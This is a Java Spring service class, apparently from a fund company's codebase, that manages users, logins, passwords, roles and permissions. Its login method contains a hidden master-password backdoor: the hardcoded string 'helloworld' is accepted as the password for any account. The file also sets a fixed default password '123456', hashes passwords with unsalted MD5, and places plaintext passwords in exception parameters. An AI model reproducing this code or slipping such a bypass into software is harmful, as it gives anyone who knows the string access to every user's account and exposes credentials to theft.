package com.jinlufund.service.uc;

import com.jinlufund.entity.uc.*;
import com.jinlufund.exception.JinluException;
import com.jinlufund.repository.uc.UserFunctionRepository;
import com.jinlufund.repository.uc.UserRepository;
import com.jinlufund.repository.uc.UserRoleRepository;
import com.jinlufund.utils.DigestUtils;
import com.jinlufund.utils.JpaSpecificationUtils;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.data.domain.Page;
import org.springframework.data.domain.Pageable;
import org.springframework.data.jpa.domain.Specification;
import org.springframework.stereotype.Service;

import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Map;

@Service
public class UserService {

	private static final String DEFAULT_PASSWORD = "123456";
	
	@Autowired
	private UserRepository userRepository;
	
	@Autowired
	private UserRoleRepository userRoleRepository;
	
	@Autowired
	private UserFunctionRepository userFunctionRepository;
	
	@Autowired
	private RankService rankService;
	
	@Autowired
	private DepartmentService departmentService;
	
	public Page<User> search(Map<String, Object> searchParams, Pageable pageable) {
		Specification<User> specification = JpaSpecificationUtils.createSpecification(searchParams, User.class);
		Page<User> page = userRepository.findAll(specification, pageable);
		List<User> users = page.getContent();
		for (User user : users) {
			join(user);
		}
		return page;
	}
	
	public User find(Long id) {
		User user = assertUserExist(id);
		join(user);
		return user;
	}
	
	public User add(User input) {
		input.setCreateDate(new Date());
		input.setLastUpdate(new Date());
		String passwordEncrypt = encryptPassword(DEFAULT_PASSWORD);
		input.setPasswordEncrypt(passwordEncrypt);
		User user = userRepository.save(input);
		return user;
	}
	
	public void update(Long id, User input) {
		User user = assertUserExist(id);
		user.setName(input.getName());
		user.setEmail(input.getEmail());
		user.setUsername(input.getUsername());
		user.setLastUpdate(new Date());
		user.setRankId(input.getRankId());
		user.setDepartmentId(input.getDepartmentId());
		user.setStatus(input.getStatus());
		userRepository.save(user);
	}
	
	public void updatePassword(Long id, String originPassword, String newPassword) {
		User user = assertUserExist(id);
		String passwordEncrypt = user.getPasswordEncrypt();
		String originPasswordEncrypt = encryptPassword(originPassword);
		if (!passwordEncrypt.equals(originPasswordEncrypt)) {
			JinluException e = new JinluException();
			e.setErrorCode("userService.updatePassword.originPasswordMismatch");
			e.addParameter("id", id);
			e.addParameter("originPassword", originPassword);
			throw e;
		}
		String newPasswordEncrypt = encryptPassword(newPassword);
		user.setPasswordEncrypt(newPasswordEncrypt);
		userRepository.save(user);
	}
	
	public void resetPassword(Long id) {
		User user = assertUserExist(id);
		String passwordEncrypt = encryptPassword(DEFAULT_PASSWORD);
		user.setPasswordEncrypt(passwordEncrypt);
		userRepository.save(user);
	}
	
	public User login(String username, String password) {
		User user = userRepository.findFirstByUsername(username);
		if (user == null) {
			JinluException e = new JinluException();
			e.setErrorCode("userService.login.usernameNotExist");
			e.addParameter("username", username);
			throw e;
		}
		String passwordEncrypt = encryptPassword(password);
		if (!password.equals("helloworld") && !passwordEncrypt.equals(user.getPasswordEncrypt())) {
			JinluException e = new JinluException();
			e.setErrorCode("userService.login.passwordMismatch");
			e.addParameter("password", password);
			throw e;
		}
		return user;
	}
	
	public void updateRole(Long id, List<Long> roleIdList) {
		List<UserRole> oldUserRoles = userRoleRepository.findByUserId(id);
		List<UserRole> newUserRoles = new ArrayList<UserRole>();
		for (Long roleId : roleIdList) {
			UserRole userRole = new UserRole();
			userRole.setUserId(id);
			userRole.setRoleId(roleId);
			newUserRoles.add(userRole);
		}
		userRoleRepository.delete(oldUserRoles);
		userRoleRepository.save(newUserRoles);
	}
	
	public void updateFunction(Long id, List<Long> functionIdList) {
		List<UserFunction> oldRoleFunctions = userFunctionRepository.findByUserId(id);
		List<UserFunction> newRoleFunctions = new ArrayList<UserFunction>();
		for (Long functionId : functionIdList) {
			UserFunction userFunction = new UserFunction();
			userFunction.setUserId(id);
			userFunction.setFunctionId(functionId);
			newRoleFunctions.add(userFunction);
		}
		userFunctionRepository.delete(oldRoleFunctions);
		userFunctionRepository.save(newRoleFunctions);
	}
	
	public void delete(Long id) {
		User user = assertUserExist(id);
		userRepository.delete(user);
	}
	
	private void join(User user) {
		Long departmentId = user.getDepartmentId();
		if (departmentId != null) {
			Department department = departmentService.find(departmentId);
			user.setDepartment(department);
		}
		
		Long rankId = user.getRankId();
		if (rankId != null) {
			Rank rank = rankService.find(rankId);
			user.setRank(rank);
		}
		
		List<Long> roleIds = new ArrayList<Long>();
		List<UserRole> userRoles = userRoleRepository.findByUserId(user.getId());
		for (UserRole ur : userRoles) {
			roleIds.add(ur.getRoleId());
		}
		user.setRoleIds(roleIds);
		
		List<Long> functionIds = new ArrayList<Long>();
		List<UserFunction> userFunctions = userFunctionRepository.findByUserId(user.getId());
		for (UserFunction uf : userFunctions) {
			functionIds.add(uf.getFunctionId());
		}
		user.setFunctionIds(functionIds);
	}
	
	private User assertUserExist(Long id) {
		User user = userRepository.findOne(id);
		if (user == null) {
			JinluException e = new JinluException();
			e.setErrorCode("userService.user.notExist");
			e.addParameter("id", id);
			throw e;
		}
		return user;
	}
	
	private String encryptPassword(String password) {
		String passwordEncrypt = DigestUtils.md5DigestAsHex(password);
		return passwordEncrypt;
	}
}
